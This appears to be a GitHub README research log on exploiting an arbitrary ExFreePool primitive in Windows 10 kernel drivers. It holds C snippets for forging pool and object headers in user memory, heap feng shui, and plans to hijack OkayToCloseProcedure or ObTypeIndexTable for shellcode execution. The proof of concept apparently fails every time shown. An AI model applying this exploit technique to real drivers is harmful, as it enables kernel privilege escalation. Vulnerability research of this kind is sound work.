# ExFreePool Vulnerability
 My research into taking advantage of ExFreePool primitives.

# TO-DOs
* Add an arbitrary read-write helper function to the kernel driver, after realizing how big of a pain in the arse NTVDM is
* Modify the nt!ObTypeIndexTable pointers to point to our arbitrary code
* Pwn the machine
* ... and pray to god that this method worked to begin with...

### Disclaimer
The write-up below is an explanation behind my research into the exploit primitive. The information is subject to change at any time, with or without notice. Additionally, expect grammatical errors, as I do not constantly revise my work. If you do catch any grammatical or fundamental structure errors, please create an issue, and I will work to resolve it.

As a follow-up to this disclaimer, after I read [@FuzzySecurity](https://github.com/FuzzySecurity)'s write-up more closely, it appears that this technique will only be effective against [Windows 10 32-bit with NTVDM](https://blog.xpnsec.com/hevd-null-pointer/). This is because we do not have control over the type index table directly, and thus we must map the NULL page, which is explained in his article.

### Motivation
 A while back, I discovered a zero day vulnerability in an antivirus driver, allowing low-privileged users to free an arbitrary pool chunk via the ExFreePool kernel API. As someone who wants to grasp a firmer understanding of the Windows pool internals, I decided to conduct some of my own research into it. Not to mention, that I find the words "kernel pool" particularly funny, for one reason or another. Probably because it reminds me of a swimming pool. Who knows?
 
### The Driver That Can't Drive
For testing of this exploit technique, I decided to make a driver similar to that of [HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver), but added my own primitive that would allow me to free an arbitrary pool chunk. Please take note of this while you read through the write-up!
 
### Pool Chunks In User Land!?!?
 From what I understood from the vulnerability I discovered, I had the ability to free an arbitrary pool chunk. I decided to perform some Google-Fu, with no articles or papers documenting this kind of exploit primitive. It was an exploit primitive that was never thought of before. When I was reminded of my discovery a couple days ago, I set out to perform some of my own research. As you can see in this repository, I have created a special driver that would allow the user to free an arbitrary pool chunk, without checks to whether or not the chunk resided in user land. I have also created a proof-of-concept to test my theories, which can be found in this repository as well, along with the three (technically four) fully-reversed pool structures.
 
 Though, here is the caveat: you do **not** have a primitive to allocate a pool chunk in kernel land. How would I have allocated a pool chunk without bug checking the machine? Or, how would I have been able to attempt freeing the fake pool structure to begin with? The answers to these questions are what I have sought after.
 
 I have been aware I can spray the kernel non-paged pools with objects, such as the Event or Semaphore objects. However, I was not able to control the contents of these objects. Specifically, I want to be able to control an entire pool chunk's data, and then redirect execution flow via overwriting the procedure callbacks (e.g. OkayToCloseProcedure). By overwriting this procedure callback pointer with a pointer to my shellcode, I can begin executing arbitrary code upon freeing the pool chunk! I may not be able to control data in kernel land, but I can definitely control data in user land. Then, it hit me: "Could I create a carefully crafted pool structure in user-land?" And yes, I can!
 
### The Dive Into The Non-Paged Swimming Pools
 The kernel memory pool is the heap-equivalent to user-land memory, and non-paged pool memory is memory that will always reside in memory, never paged out into the page file or onto the disk. I want to be able to recreate the user-mode equivalent to the non-paged memory pool. With that, I started off by utilizing HeapAlloc to allocate memory onto the process heap, then VirtualLock afterwards to lock the allocated heap memory in memory. Note that I chose an allocation of 4096 (0x1000) bytes to closely resemble an actual pool page.
 ```C
 memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the process heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the process heap. Allocation Address: 0x%p", memory_page);

	if (!VirtualLock(memory_page, 4096))
	{
		printf("\n[-] Failed to lock the page of heap memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Locked the page of heap memory.");
 ```
 
 I now have my fake memory page. For those who are not fond of the Windows pool structures, I highly advise you give these provided write-ups a reading before continuing.
 * [Exploit Development: Swimming In The (Kernel) Pool - Leveraging Pool Vulnerabilities From Low-Integrity Exploits, Part 1](https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/)
 * [Kernel Pool Exploitation on Windows 7](https://www.exploit-db.com/docs/english/16032-kernel-pool-exploitation-on-windows-7.pdf)
 * [Part 16: Kernel Exploitation -> Pool Overflow](https://www.fuzzysecurity.com/tutorials/expDev/20.html)
 
 With my new, fake memory page, I want to recreate the entire pool chunk perfectly. As you may have learned, exploiting pool overflow bugs only requires that you overwrite the OkayToCloseProcedure (or an equivalent) pointer. With this overwrite, you did not have to overwrite the entire pool structure, as it would remain entirely valid (assuming the headers prior to the pointer overwrite were valid themselves). However, I allocated an entire chunk of memory that has **no** pool structures within whatsoever. With this in mind, I had to rebuild the entire pool structure by hand.
 
 Provided by the snippet below, I used the Fwpp non-paged pool structures as reference when I initialized the three core pool structures.
 ```C
void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffaa0b73f0dae0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x1000;					// +0x002 BlockSize        : 0y00010111 (0x17) (Changed to 0x1000 to match the fake pool allocation)
	pool_header.PoolType = NonPagedPoolExecute;		// +0x002 PoolType         : 0y00000010 (0x2) (Changed to 0 so the pool is mapped as NonPagedPoolExecute as opposed to NonPagedPoolMustSucceed)
	pool_header.Ulong1 = 0x2170000;					// +0x000 Ulong1           : 0x2170000
	pool_header.PoolTag = 0x70707746;				// +0x004 PoolTag          : 0x70707746
	pool_header.AllocatorBackTraceIndex = 0x6B5E;	// +0x008 AllocatorBackTraceIndex : 0x6b5e
	pool_header.PoolTagHash = 0x9417;				// +0x00a PoolTagHash      : 0x9417
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;  // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffaa0b73f0dae0+8

	object_header_quota.PagedPoolCharge = 0x94176B5E;					   // +0x000 PagedPoolCharge  : 0x94176b5e
	object_header_quota.NonPagedPoolCharge = 0xDE0E839E;				   // +0x004 NonPagedPoolCharge : 0xde0e839e
	object_header_quota.SecurityDescriptorCharge = 0x73F132A0;			   // +0x008 SecurityDescriptorCharge : 0x73f132a0
	object_header_quota.Reserved1 = 0xFFFFAA0B;							   // +0x00c Reserved1        : 0xffffaa0b
	object_header_quota.SecurityDescriptorQuotaBlock = 0xFFFF8407C9848D78; // +0x010 SecurityDescriptorQuotaBlock : 0xffff8407`c9848d78 Void
	object_header_quota.Reserved2 = 0;									   // +0x018 Reserved2        : 0
}

void initialize_object_header(POBJECT_HEADER input_object_header)
{
	OBJECT_HEADER object_header = *input_object_header;						// dt nt!_OBJECT_HEADER ffffaa0b73f0dae0+8+10

	object_header.PointerCount = 0x136305996165768;							// +0x000 PointerCount     : 0n-136305996165768
	object_header.HandleCount = 0;											// +0x008 HandleCount      : 0n0
	object_header.NextToFree = (void*)0;									// +0x008 NextToFree       : (null)
	object_header.Lock = (void*)0;											// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;											// +0x018 TypeIndex        : 0 '';
	object_header.TraceFlags = 0;											// +0x019 TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;											// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;									// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;												// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;												// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;											// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;											// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;										// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;										// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;										// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;									// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;									// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;										// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0;												// +0x01c Reserved         : 0
	object_header.ObjectCreateInfo = 0x0100000000000130;					// +0x020 ObjectCreateInfo : 0x01000000`00000130 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = 0x0100000000000130;					// +0x020 QuotaBlockCharged : 0x01000000`00000130 Void
	object_header.SecurityDescriptor = 0x0001001000000130;					// +0x028 SecurityDescriptor : 0x00010010`00000130 Void
	object_header.Body = (void*)0;											// +0x030 Body             : _QUAD
}
 ```
 
 You will find that there were no fully-reversed pool structures for Windows 10 (any version) online. With that, I had to perform a fair amount of my own work. I had to spend some of my time in WinDbg, dumping out the contents of each structure. After I finished the recreation of these three structures, I was able to create these initialization functions. These three functions will initialize the structures that I pass through them, so I can begin placing these parts of each structure onto my fake pool allocation.
 
 Gathering from what I have learned about the Windows pool internals, is that there is no padding between each structure in memory. This is evident in [@connormcgarr](https://github.com/connormcgarr) and [@FuzzySecurity](https://github.com/FuzzySecurity)'s write-up on pool overflow vulnerabilities. Now that I have built my three core pool structures, it is time to place them onto my heap allocation. Bare in mind that each field in each structure appears in order of how WinDbg interpreted them, which appeared to be sufficient.
 ```C
 *memory_page = pool_header.PreviousSize;
	*(memory_page + 4) = pool_header.PoolIndex;
	*(memory_page + 8) = pool_header.BlockSize;
	*(memory_page + 16) = pool_header.PoolType;
	*(memory_page + 20) = pool_header.Ulong1;
	*(memory_page + 24) = pool_header.PoolTag;
	*(memory_page + 28) = pool_header.AllocatorBackTraceIndex;
	*(memory_page + 30) = pool_header.PoolTagHash;
	printf("\n[+] Mapped the fake pool header onto the heap allocation.");

	*(memory_page + 32) = object_header_quota.PagedPoolCharge;
	*(memory_page + 36) = object_header_quota.NonPagedPoolCharge;
	*(memory_page + 40) = object_header_quota.SecurityDescriptorCharge;
	*(memory_page + 44) = object_header_quota.Reserved1;
	*(memory_page + 48) = object_header_quota.SecurityDescriptorQuotaBlock;
	*(memory_page + 52) = object_header_quota.Reserved2;
	printf("\n[+] Mapped the fake object header quota onto the heap allocation.");

	*(memory_page + 56) = object_header.PointerCount;
	*(memory_page + 64) = object_header.HandleCount;
	*(memory_page + 72) = object_header.NextToFree;
	*(memory_page + 80) = object_header.Lock;
	*(memory_page + 81) = object_header.TypeIndex;
	*(memory_page + 82) = object_header.TraceFlags;
	*(memory_page + 84) = object_header.DbgRefTrace;
	*(memory_page + 88) = object_header.DbgTracePermanent;
	*(memory_page + 89) = object_header.InfoMask;
	*(memory_page + 90) = object_header.Flags;
	*(memory_page + 94) = object_header.NewObject;
	*(memory_page + 98) = object_header.KernelObject;
	*(memory_page + 102) = object_header.KernelOnlyAccess;
	*(memory_page + 106) = object_header.ExclusiveObject;
	*(memory_page + 110) = object_header.PermanentObject;
	*(memory_page + 114) = object_header.DefaultSecurityQuota;
	*(memory_page + 118) = object_header.SingleHandleEntry;
	*(memory_page + 122) = object_header.DeletedInline;
	*(memory_page + 126) = object_header.Reserved;
	*(memory_page + 130) = object_header.ObjectCreateInfo;
	*(memory_page + 138) = object_header.QuotaBlockCharged;
	*(memory_page + 146) = object_header.SecurityDescriptor;
	*(memory_page + 152) = object_header.Body;
	printf("\n[+] Mapped the fake object header onto the heap allocation.\n[!] Freeing the target pool chunk in five seconds...");
 ```
 
 Now that I have my fake pool chunk prepared nicely in process memory, lets try freeing the allocation!
 ![Screenshot of exploit proof-of-concept](https://github.com/Exploitables/ExFreePool-Vulnerability/blob/main/Figure%201.png?raw=true)
 ![Screenshot of the bug check](https://github.com/Exploitables/ExFreePool-Vulnerability/blob/main/Figure%202.png?raw=true)
 
 ... it appears that freeing the allocation was a bust. This was where I left off at last night, but I have encountered some scenarios where it would attempt to free the allocation, but fail, throwing a non-bug-checking access violation. A day or two afterwards, I learned that the page structure must adhere to page alignment requirements.
 ![Screenshot of a non-crashing access violation](https://github.com/Exploitables/ExFreePool-Vulnerability/blob/main/Figure%203.png?raw=true)

### Pool Page Alignment Feng-Shui
 So, what went wrong with the proof-of-concept code? What I originally thought was that the heap memory was being paged out of memory, turned out to be an incorrect assumption. I over-looked one crucial detail, which is key to ensuring that the kernel recognizes the fake pool structure to be valid: page alignment. As depicted in the image below, I needed to get the heap into a predictable state, so I can allocate a 4096-byte heap allocation that is page aligned. Originally, I was planning on utilizing the HeapReAlloc function, but I was reminded of a very helpful memory layout tactic. What is the very helpful predictable memory layout tactic, you may be asking yourself?
 ```C
 for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		heaps[i] = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
		if (!heaps[i])
		{
			printf("\n[-] Failed to allocate heap object %d.", i);
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Allocated %d heap objects. Successfully set the process heap into a predictable state.", success_counter);
 ```
 If you said "Feng-Shui," you are correct my friend! I allocated 8192 heap objects onto the process' heap memory to get the layout of the heap into a predictable state. Of course, you will want to free the objects after you have set up the fake pool structure in heap memory. Now, lets try out my new proof-of-concept with forced page alignment allocations!
 ![Screenshot of a non-crashing access violation](https://github.com/Exploitables/ExFreePool-Vulnerability/blob/main/Figure%204.png?raw=true)
 
 As you can see in the screenshot depicted above, it did not bug check the machine, no matter how many times I ran the proof-of-concept code! It is more stable than ever before! However, as you may have noticed, the ExFreePoolWithTag function threw an access violation attempting to free it. Perhaps, it was the actual pool structure itself with invalid types?

### Rebuilding A Swimming Pool... Again...
I decided to try and reverse-engineer the three pool structures one more time, in hopes that recreation of these structures will yield me a different result. This time, my virtual machine is using Windows 10 21H2 as opposed to Windows 10 20H2. As I did not want to reference someone else's structure to ensure correctness, I rebuilt the following C-style structure by hand, with the help of WinDbg:
```C
typedef struct _POOL_HEADER
{
	union
	{
		struct
		{
			unsigned char PreviousSize;
			unsigned char PoolIndex;
		};

		struct
		{
			unsigned char BlockSize;
			unsigned char PoolType;
		};
		unsigned long Ulong1;
	};

	unsigned long PoolTag;
	union
	{
		void* ProcessBilled;
		unsigned short AllocatorBackTraceIndex;
	};

	unsigned short PoolTagHash;
} POOL_HEADER, * PPOOL_HEADER;

typedef struct _OBJECT_HEADER_QUOTA
{
	unsigned long PagedPoolCharge;
	unsigned long NonPagedPoolCharge;
	unsigned long SecurityDescriptorCharge;
	unsigned long Reserved1;
	void* SecurityDescriptorQuotaBlock;
	unsigned long long Reserved2;
} OBJECT_HEADER_QUOTA, * POBJECT_HEADER_QUOTA;

typedef struct _QUAD
{
	union
	{
		unsigned long long UseThisFieldToCopy;
		double DoNotUseThisField;
	};
} QUAD, * PQUAD;

typedef struct _OBJECT_HEADER
{
	unsigned long long PointerCount;
	union
	{
		unsigned long long HandleCount;
		void* NextToFree;
	};

	void* Lock;
	unsigned char TypeIndex;
	union
	{
		unsigned char TraceFlags;
		unsigned char DbgRefTrace;
		unsigned char DbgTracePermanent;
	};

	unsigned char InfoMask;
	union
	{
		unsigned char Flags;
		unsigned char NewObject;
		unsigned char KernelObject;
		unsigned char KernelOnlyAccess;
		unsigned char ExclusiveObject;
		unsigned char PermanentObject;
		unsigned char DefaultSecurityQuota;
		unsigned char SingleHandleEntry;
		unsigned char DeletedInline;
	};

	unsigned long Reserved;
	union
	{
		void* ObjectCreateInfo;
		void* QuotaBlockCharged;
	};

	void* SecurityDescriptor;
	void* Body;
} OBJECT_HEADER, * POBJECT_HEADER;
```
. It should come off as unsurprising, that the structures remained, for the most part, the same. However, there are some key differences, most notably the types used in the pool header structure. Additionally, take note that I did not reverse the same pool chunk structures as I did previously; I reversed a VM3D VMware driver pool chunk. From here, I went ahead and rebuilt my fake pool allocation with my new offsets, and...
 ![Screenshot of a non-crashing access violation](https://github.com/Exploitables/ExFreePool-Vulnerability/blob/main/Figure%205.png?raw=true)
 
 ... that was unfortunate. Of course, it was worth a shot, rebuilding the entire structure by hand, as opposed to utilizing other people's resources. However, this did not solve my predicament. Tomorrow's project will be to try and map some other portion of memory that contains a section of code, and try redirecting the TypeIndex pointer to execute my arbitrary code. Perhaps, this might be why it was throwing access violations all along! Stay tuned...
